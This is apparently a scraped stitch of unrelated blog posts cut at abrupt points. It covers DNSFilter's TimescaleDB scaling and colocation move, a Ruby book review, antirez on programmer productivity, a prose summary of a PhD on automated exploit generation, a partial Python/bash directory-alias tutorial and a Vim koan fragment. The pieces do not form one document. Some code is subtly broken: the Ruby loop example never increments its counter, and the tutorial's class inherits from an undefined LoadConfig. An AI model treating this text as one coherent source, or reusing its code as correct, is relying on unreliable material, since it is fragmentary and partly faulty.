additional servers with Digital Ocean.&nbsp;</span></p><p><span>In February, our original server hit another wall and by March the Digital Ocean servers were officially online. For a few months, we had 3 TimescaleDB servers running (all receiving the same information) until it became clear the original server was no longer necessary. It wasn’t carrying much of the load anymore, and it was not as performant as the Digital Ocean servers. At that point, it was just deadweight and extra costs, so we deprecated it in June 2020.</span></p><h2><span>The spike that didn’t stop</span></h2><p><span>As of fall 2020, our daily requests have skyrocketed compared to where we were this time last year (even with that October spike in requests). To handle this sustained surge in requests, we’ve done something a little different: We now have one bare metal TimescaleDB server set up to handle </span><i><span>just</span></i><span> DNS requests. Our 2 Digital Ocean servers are currently still going strong, handling unique queries from our app and a portion of daily requests.</span></p><p><span>This change was prompted to accommodate an integration partner, but the cool thing is that we’ve actually doubled my original projection with this move. That bare metal server now processes about 6B requests per day. Granted, it does not handle the full load the Digital Ocean servers do. It handles DevOps monitoring of our infrastructure, handling far fewer read queries than our primary Digital Ocean server. Though it still processes a large number of requests daily with only 5% CPU utilization.</span></p><p><span>Meanwhile, the main Digital Ocean server rarely goes over 30% CPU utilization. Though as I’ll get into later, CPU isn’t the best metric for monitoring the health of these servers.</span></p><h2><span>The beginning of a major move to bare metal</span></h2></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="308de7c" data-element_type="section"><div><div><div data-id="746c630" data-element_type="column"><div><div><div data-id="ae9e5a0" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="576" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" alt="TimescaleDB performance on bare metal" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w"><figcaption>This is our bare metal server.

But we didn’t see that being sustainable for our business long-term.</span></p><p><span>We saw 3 possible options, and we ran costs on all of them:</span></p><ul><li><span>Colocation</span></li><li><span>Continued server rental</span></li><li><span>A major move to AWS</span></li></ul><p>Colocation was the clear winner.</p><p><span>While you need to put money down upfront, the costs begin to go down month over month. After 3 years, our server costs will be half of what they would be if we continued renting—and nearly 1/17 of what a switch to AWS would be.&nbsp;</span></p><p><span>While the monetary benefits are pretty obvious, the actual drive performance of the colocated server would be 10 times better than the AWS servers. On top of that, our setup included 648TB/month, which would have cost us $37,000 </span><i><span>alone</span></i><span> with AWS.</span></p><p><span>That bare metal server handling 6B requests daily is a </span><a href="https://netactuate.com/colocation/" target="_blank" rel="noopener"><span>colocated server</span></a><span> we built with the help of our hosting provider, </span><a href="https://netactuate.com/" target="_blank" rel="noopener"><span>NetActuate</span></a><span>.</span></p><p><span>With the performance we’re currently seeing on our bare metal server (and the cost savings), we plan on migrating </span><i><span>everything</span></i><span> from Digital Ocean to bare metal. I just don’t see anything but colocation being able to meet our needs into the future.</span></p><p><span>Using colocated servers allows us to have the fastest, newest machines at a lower cost. I told NetActuate the specs I was looking for in a server, and then their team built everything, shipped it to the data center, and racked it for us.</span></p><p><span>It’s a happy medium. I don’t want DNSFilter to be in the business of running its own datacenter. Going this route still allows me to be hands-on while not having to worry about the actual hardware day-to-day.</span></p><p><span>The main challenge for me now is hiring DevOps staff to handle ongoing infrastructure and performance management that I’ve been doing the majority of.</span></p><h2><span>Monitoring&nbsp;</span></h2><p><span>Before putting any hardware into production, first I use </span><a href="https://serverscope.io/" target="_blank" rel="noopener"><span>ServerScope</span></a><span> to understand how performant that hardware can possibly be. It also lets me know if there is anything that might indicate a defect in the hardware. That’s something that might cause limitations to the hardware’s life expectancy.</span></p><p><span>To monitor all of our servers, across both our Timescale database and our anycast network, we use </span><a href="https://www.site24x7.com/" target="_blank" rel="noopener"><span>Site24x7</span></a><span>.

You can see it held steadily around 60 MB/sec for disk writes until the end of September. That’s around the time we had a huge uptick in daily queries, causing additional strain on the server. After seeing this, we decided to add our bare metal server to start handling a large portion of DNS queries. This took some of the load off of our primary server that is still handling user interface queries (in addition to a portion of DNS requests).</span></p><p><span>However, IOPS (Input/Output Operations Per Second) is arguably the best metric to look at since databases do short bursts of access. This is in contrast to a sustained (and uninterrupted) transfer, similar to the way a file server might write information. When using ServerScope, IOPS is the most significant metric I check prior to putting a server in production. It’s valuable to know what IOPS that server is capable of handling. To get an idea of the capacity we’re looking for, </span><a href="https://www.wiredzone.com/shop/product/10028190-intel-ssdpe2ke064t8-hard-drive-nvme-6-4tb-u-2-2-5in-pcie-3-1-3d-tlc-3dwpd-dc-p4610-series-2294" target="_blank" rel="noopener"><span>one recent storage drive</span></a><span> we put into production has a random read of 654k IOPS and random write of 210k IOPS.</span></p><p><span>CPU utilization is useful to know, but really you just want to make sure that your server isn’t hitting over 80% for days or weeks at a time. That’s a sign it’s working too hard and it needs some help.&nbsp;</span></p><p><span>Another aspect we monitor is Kafka lag. What we saw in October 2019 (and later in March 2020) was TimescaleDB suddenly falling behind. In fact, it was </span><i><span>hours</span></i><span> behind. Once we saw the lag, we could investigate Disk I/O to see what the root cause of the problem was. The issue here was (again) that huge amount of new queries. TimescaleDB was suddenly writing an amount of data from Kafka it was not accustomed to writing and could not keep up. Without the ability to discover what caused the lag and subsequently working to fix it, we would have continued to get further and further behind.</span></p><h2><span>No clusters, no problem…yet</span></h2><p><span>We are still running on open source TimescaleDB after 2 years. It’s been able to handle all of the additional queries we’re now getting with our increase in users after the hardware changes I’ve talked about above. And on top of that, we haven’t used clustering </span><i><span>at all</span></i><span>.</span></p><p><span>With the announcement of </span><a href="https://blog.timescale.com/blog/timescaledb-2-0-a-multi-node-petabyte-scale-completely-free-relational-database-for-time-series/" target="_blank" rel="noopener"><span>TimescaleDB 2.0</span></a><span> and the option to use clustering for multi-node deployments in the open source version, we can continue to use open source TimescaleDB without an issue.</span></p><p><span>We’re still running a single node instance, but we do plan on implementing clusters at some point. We’ve tested clustering in the past, but there were bugs, so we never committed fully. We also haven’t used partitioning. If we try clustering again and we still run into issues or if it doesn’t allow us to scale the way we want to, partitioning is the next thing on the list for us to test.</span></p><p><span>One recent optimization we’ve made is to have chunks fit in RAM. This is a recommendation I discovered recently in </span><a href="https://docs.timescale.com/latest/api#create_hypertable-best-practices" target="_blank" rel="noopener"><span>TimescaleDB’s documentation around best practices</span></a><span>.&nbsp;</span></p><p><span>For a long time, we had our chunk interval set as a single day (24 hours). When we weren’t even breaking 200M queries a few years ago, that was fine. But we’ve grown so much, so each of our TimescaleDB servers has a separate chunk interval time. Our primary server is now set at 4 hours, and our dedicated query server (the one handling 6B queries daily) is set to </span><b>20 minutes</b><span>. This is a recent change, so it will take some time to get a clear idea of how much this change has benefited our infrastructure.</span></p><p><span>After 2 years of scaling TimescaleDB, I can make more accurate estimates and plan better. Now I know what type of stress 1B queries will put on our current servers and what changes need to be made to accommodate those new queries. We’ve also carefully mapped out our costs for the next 3 years, which will only benefit us when we run into the inevitable hiccup.&nbsp;</span></p><p><span>There is a lot more we plan on testing with TimescaleDB going forward, but we have a good idea of what the future of our server infrastructure will look like.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="fa18430" data-element_type="section"></section></div></div></div></div></div>]]>

November 19, 2020 | https://www.connerjensen.com/blog/the_ruby_programming_language_review | <a href="https://web.archive.org/web/*/https://www.connerjensen.com/blog/the_ruby_programming_language_review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>My Review of The Ruby Programming Language</h3>
<p>I needed to learn Ruby for a new job I was starting, and after a quick google search I came across <em>The Ruby Programming Language</em>.</p>
<p>After ordering it off <a href="https://www.amazon.com/Ruby-Programming-Language-Everything-Need/dp/0596516177/ref=sr_1_3?dchild=1&amp;keywords=the+ruby+programming+language&amp;qid=1602857932&amp;sr=8-3">Amazon</a> and receiving it in the mail, I cracked it open and began reading.</p>
<p><strong><em>The following is a list of things that I learned from reading this book, hopefully they will be as helpful to you as they were to me.</em></strong></p>
<p>One of the first things I was curious about is how Ruby developers view documentation.</p>
<p>The book quickly answered my question by introducing me to <em>ri</em> ruby documentation tool.</p>
<h4>ri ruby documentation</h4>
<p><em>ri</em> can be invoked followed by the name of a Ruby class, module or method and you can view the documentation right there in your terminal.</p>
<pre><code>ri String
</code></pre>
<p>The next great thing this book introduced to me was the ability to run ruby with the -w flag</p>
<h4>Ruby with the -w flag</h4>
<p>Coming from a compiled language I was missing some of the feedback it gave me while writing programs.</p>
<p>The ruby -w flag will warn you about possible things that could break your program while it is executing and takes the place of helpful compile time errors/warnings</p>
<h4>All numeric objects are immutable</h4>
<p>There are no methods that allow you to change the value of a numeric object. This is nice to know when passing numeric objects around, there is no need to worry that a method will modify the numeric object.</p>
<h4>Avoid using string literals in loops</h4>
<p>String literals are mutable, therefore Ruby cannot use the same object to represent two identical string literals.</p>
<pre><code>i = 0
while i &lt; 100
    print "hello".object_id
end
</code></pre>
<p>If you are using string literals in a loop, a new string will be created for each iteration of the loop.</p>
<h4>Make a copy of an array</h4>
<p>You can make a copy of an existing array by passing it to <code>Array.new(array_to_be_copied)</code></p>
<p>This will be useful if you don't want to mutate the old array and you want to keep your methods pure.</p>
<h4>Use symbols when you don't care about content</h4>
<p>If you are using strings not for their content, but as a unique identifier, then you should use a symbol, they are cheaper and immutable by default.</p>
<h4>Most objects are passsed by reference (pass-reference-by-value)</h4>
<p>All objects, except for Fixnum, and Symbol are passed by reference, which means the method they are passed to can mutate them.</p>
<p>Changes made to an object inside a method are visible outside the methods scope.</p>
<p>Ruby actually uses <a href="https://robertheaton.com/2014/07/22/is-ruby-pass-by-reference-or-pass-by-value/">pass-reference-by-value</a> semantics, which has some subtle, but important, differences (thanks to <a href="https://news.ycombinator.com/user?id=billyruffian">billyruffian</a> for pointing this out).</p>
<h4>Difference between an Objects <strong>Class</strong> and an Objects <strong>Type</strong></h4>
<p>An object only ever has one class and it never changes throughout the life of the object.</p>
<p>An objects's type can change throughout the life of the object. Type is defined as the set of behaviors that an object responds to, or put another way, the set of methods this object has.</p>
<p>Use is _ a? to check an objects class and respond _ to? to check an objects type.</p>
<p>An Objects type is also known as duck typing, if it walks like a duck and talks like a duck, then it's a duck.</p>
<h4>Only nil and false are False</h4>
<p>The only two values in ruby that are False are nil and false. Even an empty string "" or 0 are truthy.</p>
<h4>Multiple assignment with many left values and a single right value</h4>
<pre><code>x, y, z = [1,2,3]
</code></pre>
<p>This assignment will produce the outcome of x = 1, y = 2, and z = 3</p>
<h4>The ? operator is the only ternary operator (three operands) in ruby</h4>
<pre><code>n == 1 ? 'message' : 'message'
</code></pre>
<p>This acts as a compact if/then/else statements</p>
<p>If the expression on the left evalutates to true, then the value on the left side of : is used, otherwise the value on the right side of : is used.</p>
<h4>Raising exceptions</h4>
<p>Raise an exception with <code>raise</code> method. If called with no arguments it raises a <strong>RuntimeError</strong>. If called with a single string argument it creates a new RuntimeError exception object with the specified string as its message.</p>
<h4>Handling exceptions</h4>
<p>Handle an exception with the a <code>begin</code> statement and a <code>rescue</code> clause.</p>
<pre><code>begin
  #attempt some statements
rescue
  #write your exceptions handling code here
end
</code></pre>
<h4>Name the exception object</h4>
<p>You can name the exception in the rescue clause, then use it in your exception handling code.</p>
<pre><code>begin
  #attempt some statements
rescue =&gt; ex
  #handle the exception here
  puts "#{ex.class}: #{ex.message}"
end
</code></pre>
<h4>Using Proc objects</h4>
<p>If you have the following code</p>
<pre><code>a, b = [1,2,3], [4,5]
sum = a.inject(0) { |total, x| total + x }
sum = b.inject(sum) { |total, x| total + x }
</code></pre>
<p>You can remove the duplication of the blocks by creating a proc object</p>
<pre><code>summation = Proc.new { |total, x| total +x }
</code></pre>
<p>Then, as long as you prefix it with &amp;, you can pass this proc Object as the last parameter of any method invocation,</p>
<pre><code>sum = a.inject(0, &amp;summation)
sum = b.inject(sum, &amp;summation)
</code></pre>
<h4>Return statements in blocks and Procs</h4>
<p>Using <code>return</code> in a block will not only return to the invoking iterator, but it also returns from the method that invoked the iterator</p>
<p>Using <code>return</code> in a Proc has the same behavior, but with some added complexity.</p>
<p>Because turning a block into a Proc object allows us to pass this Proc object around to other methods, when the Proc object calls <code>return</code> it may attempt to return from a method call that has already been returned from. This will raise a <strong><em>LocalJumpError</em></strong></p>
<h4>Return statements in Lambdas</h4>
<p>Because lambdas are much like methods, using <code>return</code> in a lambda will work like a <code>return</code> statement in a method. It will return control to the enclosing scope in which the lambda was called in.</p>
<p>This makes it so we never need to worry about a <strong><em>LocalJumpError</em></strong></p>
<h3>Conclusion</h3>
<p>Hopefully, you learned something new from this post, I would highly recommend picking up <em>The Ruby Programming Language</em> it has much more to offer and does an excellent job of teaching the intricacies of the language.</p>
<p>Thanks for reading!</p>
<p>I will be following this post up with another post about what I'm learning from <em>The Ruby Programming Language</em> so keep an eye out for that.</p>

November 19, 2020 | https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn | <a href="https://web.archive.org/web/*/https://sklivvz.com/posts/guest-blog-the-mythical-10x-programmer-by-antirez?ref=hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Preface from Sklivvz: I met Salvatore (Antirez) when I was working at <a href="https://stackoverflow.com/">Stack Overflow</a> and he was the maintainer of Redis, one of the major parts of our infrastructure. Besides our common Italian heritage, what struck me was that we shared very many ideas about programming. This became absolutely evident when we took a few days and Antirez showed me the beautiful Redis code base. I've asked him to share some of his thoughts here.</p>
<p>In the mythology of programming, a 10x programmer is a programmer that can do ten times the work of another typical programmer. The programming community is exceptionally polarized about the existence or not of such a beast. However, many people told me that they believe I’m a very fast programmer. Considering I’m far from being a workaholic, I have put together a list of qualities that I believe make the most difference in programmers’ productivity.</p>
<h2>Bare programming abilities</h2>
<p>One of the most self-evident limits or strengths of a programmer is the skill to effectively implementing the basic parts of a program: a function, an algorithm, or whatever. Surprisingly the ability to use basic imperative programming constructs very efficiently to implement something is, in my experience, not as widespread as one may think. I observed experienced yet uneducated programmers getting more work done than graduate programmers, in theory extremely competent, but very poor at implementing solutions.</p>
<h2>Focus</h2>
<p>The number of hours spent writing code is irrelevant without looking at the quality of the time. External and internal factors can cause a lack of focus. Internal factors cause procrastination. They can be things like lack of interest in the project at hand (you can’t be good at doing things you do not love), lack of exercise or well-being, and poor or little sleeping. External factors are frequent meetings, work environments without actual offices, coworkers interrupting often, etcetera. It seems natural that trying to improve focus and to reduce interruptions is going to have a significant effect on programming productivity. Sometimes to gain focus, extreme measures are needed. For instance, I only read emails from time to time and do not reply to most of them.</p>
<h2>Design sacrifice</h2>
<p>Often complexity is generated when a non-fundamental goal of a project is accounting for a considerable amount of design complexity. In other cases, there is a design tension between a fundamental feature and a non-fundamental one, and this is making the more important goal very hard to reach.
A designer needs to recognize the parts of a design that are not easy wins or where there is no proportionality between the effort and the advantages. To execute a project maximizing the output, one needs to focus precisely on the aspects that matter, and that they can implement in a reasonable amount of time.
When designing the Disque message broker, I realized that by providing only best-effort ordering for the messages, I could substantially improve all the other aspects of the project: availability, query language, and client interaction, simplicity, and performance.</p>
<h2>Simplicity</h2>
<p>Simplicity is an obvious point that means all and nothing. It is worth to check how we often generate complexity to understand what simplicity is. I believe that the two main drivers of complexity are the unwillingness to perform design sacrifices and the accumulation of errors in the design activity.</p>
<p>If you think of the design process, each time we pursue a wrong path, we get farther and farther from the optimal solution. An initial design error, in the wrong hands, is not corrected with a re-design of the same system. It leads to the design of another complex solution to cope with the initial error. The project, thus, becomes more complex and less efficient at every wrong step.</p>
<p><img src="https://imgur.com/qPJakrY.png" alt="simplicity"></p>
<p>We can achieve simplicity by thinking in terms of small mental “proofs of concept” so that we can explore a large number of simple designs with our minds. This technique allows us to start working from something that looks like the most viable and direct solution. Later, experience and personal design abilities allow us to improve the design and find sensible solutions for the sub-design issues that we need to resolve.</p>
<p>However, each time a complex solution seems to be warranted, it’s essential to think deeply about how to avoid this complexity. Only continue in that direction as the last resort, even considering completely different design alternatives.</p>
<h2>Perfectionism</h2>
<p>Perfectionism comes in two variants: an engineering culture of reaching the best possible measurable performance in a program, and a personality trait. In both instances, I see this as one of the most significant barriers for a programmer to deliver things fast. Perfectionism and fear of external judgment bias us to refine a design only according to psychological or trivially measurable parameters. Instead, we tend to forget things like robustness, simplicity, ability to deliver in time. </p>
<h2>Knowledge</h2>
<p>When dealing with complex tasks, knowledge of data structures, fundamental limits of computation, non-trivial algorithms is going to have an impact on the ability to find a suitable design. It is not necessary to be a super expert in everything. Still, it is essential to be at least aware of a multitude of potential solutions for a problem. For example, it is possible to use algorithms which are very efficient at counting unique items in a stream, if we can accept some error percentage. Not everyone is familiar with them.</p>
<h2>Low-level understanding of the machine</h2>
<p>Many issues in programs, even when using high-level languages, arise from the misunderstanding of how the computer is going to perform a given task. Sometimes, this may lead to re-designing and re-implementing a tool from scratch because there is a fundamental problem in the tools or algorithms used. High competence in C, understanding of how CPUs work, and knowledge of how the kernel and system calls are implemented, can be essential in preventing bad, late-stage surprises.</p>
<h2>Debugging skills</h2>
<p>It is surprisingly easy to spend an enormous amount of effort to find bugs. Being able to focus on a bug incrementally and to fix it with a rational set of steps, together with having to deal with simple code that is unlikely to contain too many bugs, can have a significant effect on the programmer's efficiency.</p>
<p>In conclusion, it is not surprising to me to see how the above qualities of a programmer can have a 10x impact on the output. Combined, they allow for proper implementations of designs that start from a viable model and can be several times simpler than alternatives. There is a way to stress simplicity that I like to call “opportunistic programming.” Basically, at every development step, the set of features to implement is chosen to have the maximum impact on the user base of the program, with the minimum requirement of efforts.</p>

<p>Over the summer I defended my PhD thesis. You can find it <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2020/11/heelan_phd_thesis.pdf" target="_blank">here</a>. </p>



<p>To give a super quick summary (prior to a rather verbose one ;)):</p>



<ul><li>Pre-2016 exploit generation was primarily focused on single-shot, completely automated exploits for stack-based buffer overflows in things like network daemons and file parsers. In my opinion, the architecture of such systems unlikely to enable exploit generation systems for more complex bug classes, different target software, and in the presence of mitigations. </li><li>Inspired by the success of fuzzing at bug finding, I wanted to bring greybox input generation to bear on exploit generation. As a monolithic problem exploit generation is too complex a task for this to be feasible, so I set about breaking exploit generation down into phases and implementing greybox solutions for each stage. I designed these phases to be composable, and used a template language to enable for communication of solutions between phases.  </li><li>Composable solver solutions and a human-writable template language gives two, new, powerful capabilities for an exploit generation engine: 1) “Human in the loop” means we can automate the things that are currently automatable, while allowing a human to solve the things we don’t have good solvers for, and 2) If solutions are composable, and if a mock solution can be produced for any stage, then we can solve stages out of order. This leads to efficiency gains if a solution to one stage is expensive to produce, but we can mock it out and see if such a solution would even be useful to later stages, and then come back and solve for it if it does turn out to be useful. In practice I leveraged this to assume particular heap layouts, check if an exploit can be created from that point, and only come back and try to achieve that heap layout if it turns out to be exploitable. </li><li>My belief is that the future of exploit generation systems will be architectures in which fuzzing-esque input generation mechanisms are applied to granular tasks within exploit generation, and the solutions to these problems are composed via template languages that allow for human provided solutions as necessary. Symbolic execution will play a limited, but important role, when precise reasoning is required, and other over-approximate static analysis will likely be used to narrow the search problems that both the input generation and symex engines have to consider. </li><li>You’ll find a detailed description of the assumptions I’ve made in Chapter 1, as well as an outline of some of the most interesting future work, in my opinion, in the final chapter. </li></ul>



<p><strong>Background</strong></p>



<p>I originally worked on exploit generation in 2009 (MSc thesis <a rel="noreferrer noopener" href="https://seanhn.files.wordpress.com/2017/12/thesis-heelan.pdf" target="_blank">here</a>), and the approach I developed was to use concolic execution to build SMT formulas representing path semantics for inputs that cause the program to crash, then conjoin these formulas with a logical condition expressing what a successful exploit would look like, and ask an SMT solver to figure out what inputs are required to produce the desired output. This works in some scenarios where there are limited protection mechanisms (IoT junk, for example), but has a number of limitations that prevent it from being a reasonable path to real-world automatic exploit generation (AEG) solutions. There’s the ever present issue with concolic execution that scaling it up to something like a web browser is a bit of an open problem, but the killer flaw is more conceptual, and it is worth explaining as it is the same flaw found at the heart of every exploit generation system I am aware of, right up to and including everything that participated in the DARPA Cyber Grand Challenge. </p>



<p>This earlier work (mine and others) essentially treats exploit generation as a two phase process. Firstly, they find a path to a location considered to be exploitable using a normal fuzzer or symbolic execution tool. ‘Exploitable’ almost always translates to ‘return address on the stack overwritten’ in this case, and this input is then passed to a second stage to convert it to an exploit. That second stage consists of rewriting the bytes in the original input that corrupt a function pointer or return address, and potentially also rewriting some other bytes to provide a payload that will execute a shell, or something similar. This rewriting is usually done by querying an SMT solver. </p>



<p>The conceptual flaw in this approach is the idea that a crashing input as discovered by a fuzzer will, in one step, be transformable into a functioning exploit. In reality, a crashing input from a fuzzer is usually just the starting point of a journey to produce an exploit, and more often than not the initial input leading to that crash is largely discarded once the bug has been manually triaged. The exploit developer will then begin to use it as part of a larger exploit that may involve multiple stages, and leverage the bug as one component piece. </p>



<p><strong>Open Problems Circa 2016</strong></p>



<p>From 2009 to 2016 I worked on other things, but in 2016 I decided to return to academia to do a PhD and picked up the topic again. Reviewing the systems that had participated in the DARPA CGC [3], as well as prior work, there were a few apparent interesting open problems and opportunities:</p>



<ol><li>All systems I found were focused on entirely automated exploit generation, with no capacity for tandem exploit generation with a human in the loop.  </li><li>No research I could find had yet to pick up on the notion of an ‘exploitation primitive’, which is fundamental in the manual construction of exploits, and will presumably be fundamental in any automated, or semi-automated approach. </li><li>All systems treated AEG as essentially a two step process of 1) Find a path that triggers a bug, 2) Transform that path into an exploit in one shot, rather than a multi-stage ‘programming’ problem [4]. IMO, this is the primary limitation of these systems, as mentioned above, and the reason they are not extendable to more realistic scenarios. </li><li>Nobody was really leveraging greybox input generation approaches (fuzzing) extensively, outside of the task of bug finding.</li><li>Almost all systems were still focused on stack-based overflows.</li><li>Nobody was working on integrating information leaks, or dealing with ASLR, in their exploit generation systems. </li><li>Nobody was working on language interpreters/browsers.</li><li>Nobody was working on kernels.</li></ol>



<p>It’s likely that points 5-8 are the ‘reason’ for points 1-4. Once you decide to start tackling any of 5-8, by necessity, you must start thinking about multi-stage exploit generation, having human assistance, addressing bug classes other than stack-based overflows, and using greybox approaches in order to avoid the scalability traps in symbolic execution. </p>



<p><strong>Research</strong></p>



<p>With the above in mind (I didn’t touch 6 or 8), the primary goal for my PhD was to see if I could explore and validate some ideas that I think will push forward the state of the art, and form the foundation of AEG tools in the future. Those ideas are:</p>



<ol><li>Real exploits are often relatively complex programs, with multiple distinct phases in which different tasks must be solved. Much like with ‘normal’ program synthesis, it is likely that different tasks will require different solvers. Also, by breaking the problem down we naturally make it easier to solve as long as solutions to distinct phases are composable. Thus, <strong>my first goal was to break the exploitation process down into distinct phases, with the intention of implementing different solvers for each</strong>. An interesting side effect of breaking the exploit generation task down into multiple, distinct, phases was it allowed me to integrate the idea of <strong>‘lazy’ resolution of these phases</strong>, and solve them out of order. In practice, what this meant was that if a solver for an early stage was much more expensive than a later stage then my system allowed one to ‘mock’ out a solution to the early stage, and only come back to solve it for real once it was validated that having a solution for it would actually lead to an exploit. </li><li>Once exploit generation is broken down into multiple phases, we have decisions to make about how to solve each. Symbolic execution has powered the core of most exploit generation engines, but it has terrible performance characteristics. OTOH fuzzing has proven itself to be vastly more scalable and applicable to a larger set of programs. Why hadn’t fuzzing previously taken off as a primary component of of exploit generation? Well, if you treat exploit generation as a single, monolithic, problem then the state space is simply too large and there’s no reasonable feedback mechanism to navigate it. Greybox approaches that do input generation using mutation really need some sort of gradient to scale and a scoring mechanism to tell them how they are doing. Once we have broken the problem down into phases it becomes much easier to design feedback mechanisms for each stage, and the scale of the state space at each stage is also drastically reduced. <strong>My second goal was therefore to design purely greybox, fuzzing inspired, solutions for each phase of my exploitation pipeline</strong>. I purposefully committed to doing everything greybox to see how far I could push the idea, although in reality you would likely integrate an SMT solver for a few surgical tasks. </li><li>I knew it would be unlikely I’d hit upon the best solver for each pipeline stage at a first attempt, and it’s even possible that a real solution for a particular pipeline stage might be an entire PhD’s worth of research in itself. Thus it is important to enable one to swap out a particular automated solution for either a human provided solution, or an alternate solver. <strong>My third goal was then to figure out a way to enable multiple solvers to interact, be swappable, and to allow for a human in the loop</strong>. To enable this I designed a template approach whereby each stage, and a human exploit developer, could write and update exploits in a template language that further stages could understand and process. I wrote about what …</li></ol></div></article></div>

    <main>
      <div>
        <p>The full code is available as a link in the end</p>
<h2 id="intro">Intro</h2>
<p>In this post I would like to show you how to build a simple app that manages directories with aliases.</p>
<p>What I mean by that? An app that will do the following</p>
<ul>
<li>Set aliases on a given directory</li>
<li>Navigate to that directory by calling the alias name</li>
<li>Delete or update aliases</li>
<li>Set workdir as a central goto point</li>
<li>Set bash autocompletion for our fun app</li>
</ul>
<p>When this is done you we will be able to set aliases like this</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ cd /some/pathA
<span>[</span>user@hostname pathA<span>]</span>$ goto set aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ cd /some/other/path
<span>[</span>user@hostname pathB<span>]</span>$ goto set aliasNameB
<span>[</span>user@hostname pathB<span>]</span>$ goto aliasNameA
<span>[</span>user@hostname pathA<span>]</span>$ 

</code></pre></div><p>Also we will be able to set a workdir that we can use as a relative point of movement</p>
<div><pre><code data-lang="bash">
<span>[</span>user@hostname<span>]</span>$ ls /some/path
dirA dirB dirC someFile ...
<span>[</span>user@hostname<span>]</span>$ goto set-pdir /some/path
<span>[</span>user@hostname<span>]</span>$ goto dirA
<span>[</span>user@hostname dirA<span>]</span>$ goto dirB
<span>[</span>user@hostname dirB<span>]</span>$  

</code></pre></div><p>We will implement this in two sections.</p>
<ul>
<li>Build the core app that will manage our aliases state</li>
<li>Create a bash script that will use the core app</li>
</ul>
<p>I am using python since it is faster to develop with and it is a standard tool used by linux engineers, and hence
python as a dependency is not an issue (for the majority of cases at least)</p>
<h2 id="core-app-for-working-with-our-state">Core App for working with our state</h2>
<p>The state app will be responsible for the following</p>
<ul>
<li>Write/Read/Update/Delete aliases to disk</li>
<li>Export aliase information back to the caller</li>
<li>List aliases</li>
</ul>
<p>First create <strong>goto</strong> directory</p>
<p>Let us create a file called <strong>state.py</strong> and start with our main class <strong>GotoState</strong></p>
<div><pre><code data-lang="python">
<span>#!/usr/bin/env python3</span>

<span>from</span> os <span>import</span> path

<span>class</span> <span>GotoState</span>(LoadConfig):
    <span>def</span> __init__(self):
        self<span>.</span>rootDir <span>=</span> path<span>.</span>dirname(path<span>.</span>abspath(__file__))
        self<span>.</span>stateEnvFile <span>=</span> self<span>.</span>rootDir <span>+</span> <span>'/.aliases.yml'</span>

<span>if</span> __name__ <span>==</span> <span>"__main__"</span>:
    gotoState <span>=</span> GotoState()

</code></pre></div><p>Inside <strong>init</strong> we are exporting the <strong>rootDir</strong> with value the absolute path to the goto workdir.
The reason we did that is because we want <strong>stateEnvFile</strong> to be relative to the <strong>state.py</strong> file and not
relative to the invokation’s path.</p>
<p>Next we will add the code for creating and updating the <strong>.aliases.yml</strong> file. But before we do that, let us first
install pyyaml which will be the only dependency for this app (not considering python3, pip and bash)</p>
<p>Create a local directory called modules</p>
<p>Install pyyaml in modules</p>
<div><pre><code data-lang="bash">
pip install --target<span>=</span>modules/ pyyaml

pip3 freeze | grep <span>'PyYAML=='</span> &gt; requirements.txt

cat &gt; setup.sh <span>&lt;&lt;EOF
</span><span>pip install -r requirements.txt --target=modules/ 
</span><span>EOF</span>
</code></pre></div><p>Update <strong>state.py</strong> with the following code</p>

<p>Initially we define <strong>check_paths</strong> method which simply trims any trailing / from the path.
The condition is there because the method will also be called from the caller sometimes, therefore we need
to send a result back.</p>
<p>Then we define the <strong>add</strong> method which simple calls <strong>check_paths</strong> and then updates the state file with the gievn path</p>
<p>To test this, first add the following in the <strong><strong>name</strong> == <strong>main</strong></strong> section at the end</p>

<h2>Master Wq and the Windows developer</h2>

<p>Master Wq was addressing some Vim novices. After his lecture on the many
virtues of Vim, he asked if there were any questions. A young man raised his
hand.</p>

<p>“Master, by what means might one filter for the second column of a plaintext
table for all rows that contain the string ‘tcp’?”</p>

<p>Master Wq said nothing, turned to the whiteboard behind him, and wrote:</p>

<pre><code>:%!awk '/tcp/{print $2}'
</code></pre>

<p>There was a murmur of approval from the other students.</p>

<p>“But I develop on Windows … ” the student stammered.</p>

